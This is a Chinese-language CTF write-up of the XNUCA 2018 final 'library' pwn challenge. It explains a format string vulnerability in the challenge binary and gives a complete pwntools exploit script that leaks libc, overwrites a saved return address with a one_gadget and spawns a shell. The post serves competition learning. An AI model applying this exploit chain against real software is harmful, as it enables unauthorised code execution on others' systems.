---
title: XNUCA 2018 final pwn第四题library writeup
date: 2018-12-10 20:42:34
tags: [pwn, ctf, "xnuca", writeup]
---
上周被黑哥哥蛊惑去参加了xnuca2018决赛，惨遭吊打。不过这是我第一次在线下赛里写出exp，还是比较有纪念意义的。下面是本题的write up。
<!--- more --->
## 题目分析
本题的逻辑很简单，有两种用户，输入`id`为0的是`admin`用户，可以添加书籍。其他为`student`用户，能够`borrow`。本题的漏洞也很好找，主要在`read_book`的逻辑中
```c
    for ( i = v10 == 0LL; v10; i = v10 == 0LL )
    {
      v5 = "xnuca";
      v6 = 5LL;
      v7 = v10;
      do
      {
        if ( !v6 )
          break;
        v3 = v7->name[0] < *v5;
        i = v7->name[0] == *v5;
        v7 = (v7 + 1);
        ++v5;
        --v6;
      }
      while ( i );
      if ( (!v3 && !i) == v3 )
      {
        printf(v10->content, v7);
        puts("xnuca!xnuca!xnuca!");
      }
      v10 = v10->next;
      v3 = 0;
    }
```

可以看到有个很明显的格式化字符串漏洞。其中v10->content是v10这本书的内容，v7是title。这里要注意的一点是，前面`add`函数逻辑
```c
  tmp = read(0, title, 0x10uLL);
  LODWORD(v6) = tmp;
  v7 = tmp - 1;
  if ( title[v7] == '\n' )
    title[v7] = 0;
  type = magic_transfer(title);
```
title只能读入`0x10`个字节，所以我们的格式化字符串可控的只能最多每次写4字节。
## Solution
观察程序发现，每次从`menu`函数进入`read_book`，以及从`read_book` 函数退出都不会影响`rbp + 8`这个地方的值（子函数的rbp）。我们可以利用`one gadget`去get shell。但是在操作的过程中发现不满足one gadget的条件，所以我们还需要对栈先进行一下布局。

exp的思路如下：
* 利用fsb leak出libc的地址
* 用`%d%8$n`去写7次，这样就能将栈上目标位置写成0
* 分4次将`rbp + 8`的地方写入`one gadget`的地址
* 最后一次在`rbp`对位置写入`ret gadget`的地址
* get shell

## 利用脚本
```python
#! /usr/bin/env python2
# Author: 850
from pwn import *
import os


class BASE(object):
    def __init__(self, remote_host, remote_port, local_elf, gdb_script, _remote_libc, _local_libc):
        """
        initial basic paramaters
        """
        self.rhost = remote_host
        self.rport = remote_port
        self.elf_name = local_elf
        self.gdb_scripts = gdb_script
        self.local_libc = _local_libc
        self.remote_libc = _remote_libc
        self.elf = ELF(self.elf_name)
        context(os='linux', log_level='info')
        context(terminal=["xfce4-terminal", "-e"])

    def local_debug(self, gdb_attach):
        """
        debug with GDB
        """
        self.target = process(self.elf_name)
        self.libc = ELF(self.local_libc)
        self.onegadget = 0x45254
        if gdb_attach:
            gdb.attach(self.target, gdbscript=self.gdb_scripts)

    def remote_attack(self,):
        """
        try remote exploit
        """
        self.onegadget = 0x4526a
        self.libc = ELF(self.remote_libc)
        self.target. remote(self.rhost, self.rport)

    def fmtstr_read(self, title, data):

        self.target.sendlineafter("choose your id:", '0')
        self.target.sendlineafter("4. exit", '1')
        self.target.sendlineafter("title:", title)
        self.target.sendlineafter("How many sections", '1')
        self.target.sendlineafter("input section name", "xnuca")
        self.target.sendlineafter("what's the section length:", str(len(data)))
        self.target.sendlineafter("what's the section content:", data)
        self.target.sendlineafter("4. exit", '4')

        self.target.sendlineafter("choose your id:", '1')
        self.target.sendlineafter("4. exit", '3')
        self.target.sendlineafter("what's the book's title you want to read at library?", title)
        self.target.recvline()
        self.target.recvline()
        self.target.recvline()
        self.target.recvline()
        result = "{:x<8}".format(self.target.recvline()[:-19]).replace("x", '\x00')
        # print result
        self.target.sendlineafter("DO you want to take a note?", "N")
        self.target.sendlineafter("4. exit", '4')
        return result

    def fmtstr_write(self, title, data):

        self.target.sendlineafter("choose your id:", '0')
        self.target.sendlineafter("4. exit", '1')
        self.target.sendlineafter("title:", title)
        self.target.sendlineafter("How many sections", '1')
        self.target.sendlineafter("input section name", "xnuca")
        self.target.sendlineafter("what's the section length:", str(len(data)))
        self.target.sendlineafter("what's the section content:", data)
        self.target.sendlineafter("4. exit", '4')

        self.target.sendlineafter("choose your id:", '1')
        self.target.sendlineafter("4. exit", '3')
        self.target.sendlineafter("what's the book's title you want to read at library?", title)
        self.target.sendlineafter("DO you want to take a note?", "N")
        self.target.sendlineafter("4. exit", '4')

    def leak(self, ):

        self.target.sendlineafter("choose your id:", '0')
        self.target.sendlineafter("4. exit", '1')
        self.target.sendlineafter("title:", "AAA")
        self.target.sendlineafter("How many sections", '1')
        self.target.sendlineafter("input section name", "xnuca")
        self.target.sendlineafter("what's the section length:", str(len("%x.%x.%x.%x.%x.%x.%x")))
        self.target.sendlineafter("what's the section content:", "%p.%p.%p.%p.%p.%p.%p")
        self.target.sendlineafter("4. exit", '4')

        self.target.sendlineafter("choose your id:", '1')
        self.target.sendlineafter("4. exit", '3')
        self.target.sendlineafter("what's the book's title you want to read at library?", "AAA")
        self.target.recvline()
        self.target.recvline()
        self.target.recvline()
        self.target.recvline()

        result = self.target.recvline().split(".")
        return int(result[5], 16)

    def run(self,):

        fake_ret_addr = self.leak() - 232 + 8

        print hex(fake_ret_addr)
        self.target.sendlineafter("DO you want to take a note?", "N")
        self.target.sendlineafter("4. exit", '4')

        s = "%8$s"
        free_addr = u64(self.fmtstr_read(p64(solve.elf.got['free']), s))
        print hex(free_addr)
        libc_base = free_addr - solve.libc.symbols['free']
        print "libc base addr " + hex(libc_base)
        # one_gadget_addr = libc_base + 0x4526a
        one_gadget_addr = libc_base + self.onegadget
        print "one gadget" + hex(one_gadget_addr)
        part1 = one_gadget_addr

        s = "%d%8$n"
        self.fmtstr_write(p64(fake_ret_addr + 0x3c), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x3a), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x38), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x36), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x34), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x32), s)
        self.fmtstr_write(p64(fake_ret_addr + 0x30), s)

        s = "%" + str(one_gadget_addr & 0xffff) + "d%8$hn"
        self.fmtstr_write(p64(fake_ret_addr), s)

        s = "%" + str((one_gadget_addr & 0xffff0000) >> 16) + "d%8$hn"
        self.fmtstr_write(p64(fake_ret_addr + 2), s)

        s = "%" + str((one_gadget_addr & 0xffff00000000) >> 32) + "d%8$hn"
        self.fmtstr_write(p64(fake_ret_addr + 4), s)

        s = "%" + str(one_gadget_addr & 0xffff) + "d%8$hn"
        self.fmtstr_write(p64(fake_ret_addr), s)

        ret_gadget_addr = 0x400a69
        s = "%4196969c%8$n"
        print "real ret addr" + hex(fake_ret_addr - 8)
        title = p64(fake_ret_addr - 8)

        self.target.sendlineafter("choose your id:", '0')
        self.target.sendlineafter("4. exit", '1')
        self.target.sendlineafter("title:", title)
        self.target.sendlineafter("How many sections", '1')
        self.target.sendlineafter("input section name", "xnuca")
        self.target.sendlineafter("what's the section length:", str(len(s)))
        self.target.sendlineafter("what's the section content:", s)
        self.target.sendlineafter("4. exit", '4')

        self.target.sendlineafter("choose your id:", '1')
        self.target.sendlineafter("4. exit", '3')
        self.target.sendlineafter(
            "what's the book's title you want to read at library?", title)
        self.target.sendlineafter("DO you want to take a note?", "N")

        self.target.interactive()


solve = BASE(
    remote_host="10.116.1.10",
    remote_port=4452,
    local_elf="./library",
    _remote_libc="./libc.so.6",
    _local_libc="/lib64/libc.so.6",
    gdb_script="b *0x4014e0\nb * 0x401556"
)

solve.local_debug(gdb_attach=False)
# solve.remote_attack()
solve.run()
```

## 感想
写太慢了，下午才写出来，要是熬夜搞出来说不定还能苟个奖什么的，前路漫漫啊